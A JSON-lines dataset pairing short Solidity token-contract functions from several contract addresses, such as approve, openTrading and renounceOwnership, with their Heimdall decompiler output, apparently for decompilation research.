{"contract_address": "0xC4e8fE5a71C5a9947F8f882CbE91F076769ca8de", "original_solidity_code": "function balanceOf(address account)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0xe3023a720d6f4d03b78763EDB3587f123565Cc6D", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x060f7a607bAd24a75EC072b96C1a209A80ca62ed", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x3b9aca00, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xC2fc9ADEfFc2cF41f12d76ae9eB515289c4cfA6d", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_c[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_e[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7ccFBc00423e429844f344aA62D726E3C0DCbfCA", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xc8729AC1E701f3d4b5524c3937EFF6325F540fD9", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x05f5e100, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x72f44B18b3846dc634F10F2e36236dC1A2CB4B29", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x66;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4f686d3948ff9EfFeb393D0B861086577a6e1b77", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_e / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_d = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_d));\n        require(0x08, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x05f5e100, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x05f5e100;\n        var_a = 0x05f5e100;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x05f5e100);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x08 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                            if (!0x08 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x2Ceb4C183733343E17f5EfE54cD214238a1A2001", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0xB997F52A0cF32b5120eD31BEAbaeF3Af6256cb77", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n    }"}
{"contract_address": "0x06e40f90072DCE06667641Dd9c0015803dc0c3b5", "original_solidity_code": "function depositRewards(uint256 amount) external onlyOwner {\\r\\n        uint256 totalSupply = nftToken.totalSupply();\\r\\n        require(totalSupply > 0, \\\"No NFTs minted yet\\\");\\r\\n\\r\\n        require(rewardToken.transferFrom(msg.sender, address(this), amount), \\\"Transfer failed\\\");\\r\\n\\r\\n        // Distribute the deposited rewards among the existing NFTs\\r\\n        rewardPerNFT += amount / totalSupply;\\r\\n    }", "heimdall_decompiled_code": "function depositRewards(uint256 arg0) public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        var_a = 0x18160ddd00000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(nftToken).totalSupply(var_b); // staticcall\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"No NFTs minted yet\");\n        require(var_e.length > 0, \"No NFTs minted yet\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x20;\n        var_d = 0x12;\n        var_g = 0x4e6f204e465473206d696e746564207965740000000000000000000000000000;\n        var_f = 0x23b872dd00000000000000000000000000000000000000000000000000000000;\n        address var_c = msg.sender;\n        address var_d = address(this);\n        uint256 var_g = arg0;\n        (bool success, bytes memory ret0) = address(rewardToken).Unresolved_23b872dd(var_c); // call\n        var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"Transfer failed\");\n        require(var_e.length == var_e.length, \"Transfer failed\");\n        require(var_e.length, \"Transfer failed\");\n        var_h = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_g = 0x0f;\n        var_i = 0x5472616e73666572206661696c65640000000000000000000000000000000000;\n        require(var_e.length);\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x12;\n        require(!rewardPerNFT > ((arg0 / var_e.length) + rewardPerNFT));\n        var_j = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_k = 0x11;\n        rewardPerNFT = (arg0 / var_e.length) + rewardPerNFT;\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function approve(address operator, uint256 tokenId)\\n        public\\n        override\\n        onlyAllowedOperatorApproval(operator)\\n    {\\n        super.approve(operator, tokenId);\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!address(0xaaeb6d7670e522a718067333cd4e).code.length, CustomError_df2d9b42());\n        require(0x01 > arg1, CustomError_df2d9b42());\n        require(!(arg1 < totalSupply), CustomError_df2d9b42());\n        uint256 var_a = arg1;\n        var_b = 0x04;\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(0 - storage_map_b[var_a], CustomError_cfb3b942());\n        require(address(storage_map_b[var_a]) == msg.sender, CustomError_cfb3b942());\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x07;\n        var_a = msg.sender;\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_c = 0xcfb3b94200000000000000000000000000000000000000000000000000000000;\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1;\n        var_b = 0x04;\n        if (0 - storage_map_b[var_a]) {\n            var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1);\n            var_b = 0x04;\n            if (0 - storage_map_b[var_a]) {\n                var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1));\n                var_b = 0x04;\n                if (0 - storage_map_b[var_a]) {\n                }\n            }\n        }\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xc617113400000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        address var_e = address(arg0);\n        (bool success, bytes memory ret0) = address(0xaaeb6d7670e522a718067333cd4e).Unresolved_c6171134(var_d); // staticcall\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!(((var_f + ret0.length) - var_f) < 0x20), CustomError_ede71dcc());\n        require(var_f.length == var_f.length, CustomError_ede71dcc());\n        require(var_f.length, CustomError_ede71dcc());\n        var_g = 0xede71dcc00000000000000000000000000000000000000000000000000000000;\n        var_e = address(arg0);\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function forceSwapBack() external onlyOwner {\r\n        require(balanceOf(address(this)) >= swapTokensAtAmount, \"Can only swap when token amount is at or higher than restriction\");\r\n        swapping = true;\r\n        swapBack();\r\n        swapping = false;\r\n        emit OwnerForcedSwapBack(block.timestamp);\r\n    }", "heimdall_decompiled_code": "function forceSwapBack() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(this);\n        uint256 var_f = 0;\n        require(!(storage_map_n[var_e] < swapTokensAtAmount), \"Can only swap when token amount is at or higher than restriction\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x40;\n        var_d = 0x43616e206f6e6c792073776170207768656e20746f6b656e20616d6f756e7420;\n        var_g = 0x6973206174206f7220686967686572207468616e207265737472696374696f6e;\n        lpPair = 0x010000000000000000000000000000000000000000 | (uint248(lpPair));\n        require(!(tokensForBurn > 0), \"ERC20: burn amount exceeds balance\");\n        var_e = address(this);\n        var_f = 0;\n        require(!(!storage_map_n[var_e] < tokensForBurn), \"ERC20: burn amount exceeds balance\");\n        tokensForBurn = 0;\n        var_e = address(this);\n        var_f = 0;\n        require(!(ownerb > (tokensForMarketing + ownerb)), \"ERC20: burn amount exceeds balance\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(address(this), \"ERC20: burn amount exceeds balance\");\n        var_e = address(this);\n        var_f = 0;\n        require(!(storage_map_n[var_e] < tokensForBurn), \"ERC20: burn amount exceeds balance\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;\n        var_g = 0x6365000000000000000000000000000000000000000000000000000000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;\n        var_g = 0x7300000000000000000000000000000000000000000000000000000000000000;\n        if (!tokensForBurn > 0) {\n        }\n    }"}
{"contract_address": "0xc0d5852bF2E95089EcEe1Fb3D3641A7e60073D44", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool) {\\r\\n        limitsInEffect = false;\\r\\n        return true;\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        swapEnabled = uint248(swapEnabled);\n        var_a = 0x01;\n        return 0x01;\n    }"}
